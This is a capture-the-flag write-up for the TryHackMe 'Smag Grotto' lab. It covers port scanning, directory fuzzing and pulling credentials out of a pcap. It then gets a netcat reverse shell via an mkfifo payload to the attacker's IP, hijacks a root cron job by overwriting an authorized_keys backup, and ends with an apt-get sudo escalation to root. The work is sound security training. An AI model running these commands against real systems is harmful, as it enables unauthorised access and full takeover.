## Smag_Grotto TryHackMe
## Level: Easy
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A 10.10.161.219 -T4  -v -p-```

```
# Nmap 7.93 scan initiated Mon Jun 26 10:13:41 2023 as: nmap -A -T4 -v -p- -oN smag_grotto 10.10.161.219
Increasing send delay for 10.10.161.219 from 0 to 5 due to 1587 out of 3966 dropped probes since last increase.
Increasing send delay for 10.10.161.219 from 5 to 10 due to 11 out of 19 dropped probes since last increase.
Nmap scan report for 10.10.161.219
Host is up (0.25s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74e0e1b405856a15687e16daf2c76bee (RSA)
|   256 bd4362b9a1865136f8c7dff90f638fa3 (ECDSA)
|_  256 f9e7da078f10af970b3287c932d71b76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Aggressive OS guesses: Linux 5.4 (96%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.16 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 3.13 (92%), Linux 3.2 - 3.16 (92%), Linux 3.2 - 4.9 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Crestron XPanel control system (91%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.003 days (since Mon Jun 26 10:29:34 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   264.81 ms 10.8.0.1
2   264.86 ms 10.10.161.219

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 26 10:34:03 2023 -- 1 IP address (1 host up) scanned in 1222.08 seconds
```
From our scan we have 2 open ports, port 22 which runs ssh and port 80 which runs http. Enumeration today will be focused on port 80.





# Enumeration

Navigating to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/db5050dc-f3d8-44be-9a60-f94498386e40)

We get the message "this site is still heavily under development". I checked the web source page well there was nothing there.

Firing up our directory enumeration tool

command:```ffuf -u "http://10.10.161.219/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/smag_grotto]
└─$ ffuf -u "http://10.10.161.219/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.161.219/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________
index.php               [Status: 200, Size: 402, Words: 69, Lines: 13, Duration: 225ms]
index.php               [Status: 200, Size: 402, Words: 69, Lines: 13, Duration: 214ms]
mail                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 216ms]
:: Progress: [32298/32298] :: Job [1/1] :: 211 req/sec :: Duration: [0:03:10] :: Errors: 0 ::
```
Cool, we found a ```/mail``` directory

<h4>/mail</h4>
Navigating to that directory

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f037aac3-8b51-4dea-8638-8d9cbc6941e1)

We are able to read their mails, the mail contains a pcap file. Lets download the file to our machine and analyze it.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c9e0ce99-8564-4326-ade4-1fcc0ec47364)

cool stuff, we'll be analyzing this pcap file by using a tool called wireshark, this tool comes preinstalled with the kali linux operating system

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fc2e13ce-1e4a-4e8a-9e61-8fb4811af249)

After checking for a little while, I found something interetsing

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/809c4616-e1fb-465d-8503-163abc8046ff)

Right-clicking on "HTTP" and following the "TCP" stream

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2075ac6a-b1df-4da9-a613-dcdff9a61363)

cool stuff hehe😎. We found a hostname, a username and a password.

Lets add the hostname to our ```/etc/hosts``` file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6206f356-e02b-4a46-bd87-4cec49780900)

Navigating to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9be8ae5a-ee7c-4c3c-b77a-8c04837cb66b)

Clicking on ```admin.php```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/39efca26-64a0-4097-a4ca-7409345a3584)

We are required to log in. We'll be using the creds we found earlier when we were analyzing the pcap file

username:```helpdesk```         password:```cH4nG3M3_n0w```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/044ba5b0-979a-4fa2-9d7a-dabc41112fa6)

Nice, we are logged in. 

Enter a command?? How about we try the command "_fly_"?? lool just kidding. We are required to use Linux commands here

Lets start with ```id``` and ```whoami```. Using these commands doesn't display any output. So I went ahead to get a shell.

Payload:```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.133.215 1234 >/tmp/f```

You can edit the IP address to that of your kali machine.

Setting up our netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/80a3ba1c-beb3-4aa8-91a5-ad3343164203)

Now, lets paste the payload

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/22763d9f-7821-440d-adbc-eae10c7aeeee)

Checking our netcat listener;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a6e34964-1fa7-453d-a603-5d64d41aedd1)

Cool, we got a shell

Stabilizing the shell

commands:
```
python3 -c "import pty;pty.spawn('/bin/bash')"
ctrl + z (to background)
stty  raw -echo;fg
export TERM=screen
```
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/308eb1c9-d4d8-4198-a83a-f53ac75e413a)

Now, lets go ahead and escalate our privileges



# Privilege Escalation

So I found a cronjob running

command:```cat /etc/crontab```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/89a93027-26ca-4d08-82d1-754a51ef58b3)

So we can write into ```.ssh/authorized_keys```

Now, lets generate our own ssh key using the ```ssh-keygen``` command

command:```ssh-keygen -f gabimaru```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dbd4f208-db57-4d12-bf5c-9387687c06a8)

I used the name ```gabimaru```, You can choose to use a name of your choice though

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/64cfd713-fd40-4538-a90c-92a6eee64c55)

So, we'll be echoing ```gabimaru.md``` into ```.backups/jake_id_rsa.pub.backup```

Let's send the file over to the target's machine first

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eb115adc-2708-45e7-b4b2-71ec52eee55b)

Now, lets overwrite the file

command:```cp gabimaru.pub /opt/.backups/jake_id_rsa.pub.backup```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/33114366-ae97-4519-9e83-edd82bda4dc4)

Now, that was successful. Lets wait a few mins then we can go ahead and log in as user ```jake```

command:```ssh jake@10.10.161.219 -i gabimaru```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/28488002-4266-42da-9a58-00d1b5b43fcd)

cool, we have a shell as user ```jake```

Further escalating our privileges

Checking to see the programs sudo allows the user to run

command:```sudo -l```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/073158a9-481d-4290-b9d2-f7f0fab2f7f3)

User ```jake``` can run the ```apt-get``` command with sudo privileges.

Sweet😎, lets use this to escalate our privileges

Picking a payload from [GTFOBins](https://gtfobins.github.io/) 

payload:```sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh```

Lets just paste this to the target machine. Hopefully we'll get a shell as root

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/412409d1-4a2e-4a1c-ad6c-043c17890ec8)

Cool stuff, we got a shell as root


That will be all for today
<br></br>
[Back To Home](../../index.md)












